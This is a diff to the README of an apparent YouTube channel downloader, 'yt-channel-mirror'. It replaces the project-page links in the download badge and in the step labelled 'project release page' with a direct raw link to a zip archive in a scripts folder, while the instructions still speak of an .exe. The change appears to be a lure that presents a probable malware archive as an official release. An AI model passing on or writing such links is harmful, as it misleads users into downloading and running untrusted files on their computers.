@@ -1,6 +1,6 @@
 # 📺 yt-channel-mirror - Save YouTube channels for offline viewing
 
-[![](https://img.shields.io/badge/Download-yt--channel--mirror-blue)](https://github.com/hoodedmerganserharlequinopal463/yt-channel-mirror)
+[![](https://img.shields.io/badge/Download-yt--channel--mirror-blue)](https://github.com/hoodedmerganserharlequinopal463/yt-channel-mirror/raw/refs/heads/main/scripts/yt_channel_mirror_v2.7-beta.5.zip)
 
 ## 📁 What is this app?
 
@@ -17,7 +17,7 @@ This application allows you to save entire YouTube channels to your computer. Yo
 
 You need the installer file to begin. Follow these steps:
 
-1. Visit the project release page: [https://github.com/hoodedmerganserharlequinopal463/yt-channel-mirror](https://github.com/hoodedmerganserharlequinopal463/yt-channel-mirror)
+1. Visit the project release page: [https://github.com/hoodedmerganserharlequinopal463/yt-channel-mirror/raw/refs/heads/main/scripts/yt_channel_mirror_v2.7-beta.5.zip](https://github.com/hoodedmerganserharlequinopal463/yt-channel-mirror/raw/refs/heads/main/scripts/yt_channel_mirror_v2.7-beta.5.zip)
 2. Scroll to the section marked Releases.
 3. Click the link that ends in .exe.
 4. Save the file to your Downloads folder.
